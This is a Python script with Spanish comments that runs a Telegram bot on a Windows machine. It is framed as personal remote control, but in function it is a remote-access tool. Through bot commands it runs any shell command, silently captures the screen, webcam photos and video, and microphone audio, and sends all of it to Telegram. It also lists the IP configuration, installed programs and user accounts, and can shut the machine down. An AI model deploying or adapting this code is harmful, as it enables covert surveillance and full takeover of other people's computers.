import sys
import os
import cv2
import gc
import pyautogui
import threading
from PIL import Image
import time
import ctypes
import numpy as np
import telebot

# ===================== CONFIGURACIÓN =====================
TOKEN = os.getenv("TELEGRAM_TOKEN", "TU_TOKEN_AQUI")  # Token de tu bot
CHAT_ID = int(os.getenv("TELEGRAM_CHAT_ID", "TU_CHAT_ID_AQUI"))  # SOLO VOS TENÉS ACCESO

bot = telebot.TeleBot(TOKEN)

# ===================== FUNCIÓN DE AUTORIZACIÓN =====================
def autorizado(message):
    if message.chat.id != CHAT_ID:
        bot.send_message(message.chat.id, "⛔ No tenés permiso para usar este bot.")
        return False
    return True

# ===================== AVISO INICIAL =====================
try:
    bot.send_message(CHAT_ID, "✅ Bot iniciado correctamente en segundo plano")
except Exception as e:
    with open("error.log", "a") as f:
        f.write(f"Error al iniciar bot: {e}\n")

# ===================== FUNCIONES =====================

@bot.message_handler(commands=['start'])
def start(message):
    if not autorizado(message): return
    bot.reply_to(message, "Hola Luis, control remoto activado desde la PC i7 💻")

# ----- COMANDOS CMD -----
@bot.message_handler(commands=['cmd'])
def ejecutar_cmd(message):
    if not autorizado(message): return
    try:
        comando = message.text.split(" ", 1)[1]
        resultado = os.popen(comando).read()
        if resultado.strip():
            bot.send_message(message.chat.id, f"🖥️ Resultado:\n{resultado[:4096]}")
        else:
            bot.send_message(message.chat.id, "✅ Comando ejecutado, pero sin salida.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

# ----- CAPTURA DE PANTALLA -----
@bot.message_handler(commands=['pantalla'])
def captura_pantalla(message):
    if not autorizado(message): return
    try:
        captura = pyautogui.screenshot()
        archivo = "pantalla.png"
        captura.save(archivo)
        with open(archivo, 'rb') as img:
            bot.send_photo(message.chat.id, img)
        os.remove(archivo)
        gc.collect()
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error al capturar pantalla: {e}")

# ----- FOTO CON WEBCAM -----
@bot.message_handler(commands=['camara'])
def sacar_foto(message):
    if not autorizado(message): return
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            archivo = "foto.jpg"
            cv2.imwrite(archivo, frame)
            cam.release()
            cv2.destroyAllWindows()
            with open(archivo, 'rb') as img:
                bot.send_photo(message.chat.id, img)
            os.remove(archivo)
        else:
            bot.send_message(message.chat.id, "❌ No se pudo acceder a la cámara.")
        gc.collect()
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Error: {e}")

# ----- GRABAR PANTALLA EN VIDEO -----
@bot.message_handler(commands=['pantalla_video'])
def grabar_pantalla(message):
    if not autorizado(message): return
    def grabar():
        try:
            duracion = int(message.text.split(" ")[1])
            ancho, alto = pyautogui.size()
            codec = cv2.VideoWriter_fourcc(*"XVID")
            out = cv2.VideoWriter("pantalla.avi", codec, 10.0, (ancho, alto))
            bot.send_message(message.chat.id, f"🎬 Grabando pantalla por {duracion} segundos...")
            for _ in range(duracion * 10):
                img = pyautogui.screenshot()
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
                out.write(frame)
            out.release()
            with open("pantalla.avi", "rb") as f:
                bot.send_document(message.chat.id, f)
            os.remove("pantalla.avi")
            gc.collect()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error al grabar pantalla: {e}")
    threading.Thread(target=grabar).start()

# ----- GRABAR VIDEO WEBCAM -----
@bot.message_handler(commands=['grabar'])
def grabar_video(message):
    if not autorizado(message): return
    def grabar():
        try:
            duracion = int(message.text.split(" ")[1])
            cam = cv2.VideoCapture(0)
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter('cam.avi', fourcc, 20.0, (640,480))
            bot.send_message(message.chat.id, f"📹 Grabando webcam por {duracion} segundos...")
            inicio = time.time()
            while int(time.time() - inicio) < duracion:
                ret, frame = cam.read()
                if ret:
                    out.write(frame)
            cam.release()
            out.release()
            cv2.destroyAllWindows()
            with open("cam.avi", "rb") as f:
                bot.send_document(message.chat.id, f)
            os.remove("cam.avi")
            gc.collect()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error al grabar video: {e}")
    threading.Thread(target=grabar).start()

# ----- GRABAR AUDIO -----
@bot.message_handler(commands=['audio'])
def grabar_audio(message):
    if not autorizado(message): return
    def grabar():
        try:
            import sounddevice as sd
            from scipy.io.wavfile import write
            duracion = int(message.text.split(" ")[1])
            fs = 44100
            bot.send_message(message.chat.id, f"🎙️ Grabando audio {duracion} segundos...")
            audio = sd.rec(int(duracion * fs), samplerate=fs, channels=2)
            sd.wait()
            write("audio.wav", fs, audio)
            with open("audio.wav", "rb") as f:
                bot.send_document(message.chat.id, f)
            os.remove("audio.wav")
            gc.collect()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error al grabar audio: {e}")
    threading.Thread(target=grabar).start()

# ----- MOSTRAR MENSAJE -----
@bot.message_handler(commands=['mensaje'])
def mostrar_mensaje(message):
    if not autorizado(message): return
    try:
        texto = message.text.split(" ", 1)[1]
        ctypes.windll.user32.MessageBoxW(0, texto, "🚩 ALERTA", 1)
        bot.send_message(message.chat.id, "💼 Mensaje mostrado en pantalla.")
    except:
        bot.send_message(message.chat.id, "⚠️ Formato incorrecto. Ej: /mensaje Hola Luis")

# ----- APAGAR Y REINICIAR -----
@bot.message_handler(commands=['apagar'])
def apagar_equipo(message):
    if not autorizado(message): return
    try:
        os.system("shutdown /s /t 1")
        bot.send_message(message.chat.id, "🚩 Apagando el equipo...")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error al apagar: {e}")

@bot.message_handler(commands=['reiniciar'])
def reiniciar_equipo(message):
    if not autorizado(message): return
    try:
        os.system("shutdown /r /t 1")
        bot.send_message(message.chat.id, "🔄 Reiniciando el equipo...")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error al reiniciar: {e}")

# ----- MOSTRAR IP -----
@bot.message_handler(commands=['ip'])
def mostrar_ip(message):
    if not autorizado(message): return
    try:
        resultado = os.popen("ipconfig").read()
        bot.send_message(message.chat.id, f"📡 Dirección IP:\n{resultado[:4000]}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error al obtener IP: {e}")

# ----- LISTAR PROGRAMAS -----
@bot.message_handler(commands=['programas'])
def listar_programas(message):
    if not autorizado(message): return
    try:
        ruta1 = r'C:\Program Files'
        ruta2 = r'C:\Program Files (x86)'
        programas = os.listdir(ruta1) + os.listdir(ruta2)
        listado = "\n".join(programas)
        bot.send_message(message.chat.id, f"💾 Programas instalados:\n{listado[:4000]}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error al listar programas: {e}")

# ----- LISTAR USUARIOS -----
@bot.message_handler(commands=['usuarios'])
def listar_usuarios(message):
    if not autorizado(message): return
    try:
        resultado = os.popen("net user").read()
        bot.send_message(message.chat.id, f"👥 Usuarios del sistema:\n{resultado}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error al listar usuarios: {e}")

# ===================== LOOP PRINCIPAL =====================
while True:
    try:
        print("✅ Bot corriendo... esperando comandos.")
        bot.polling(none_stop=True, interval=0, timeout=30)
    except Exception as e:
        with open("error.log", "a") as f:
            f.write(f"Error en polling: {e}\n")
        time.sleep(5)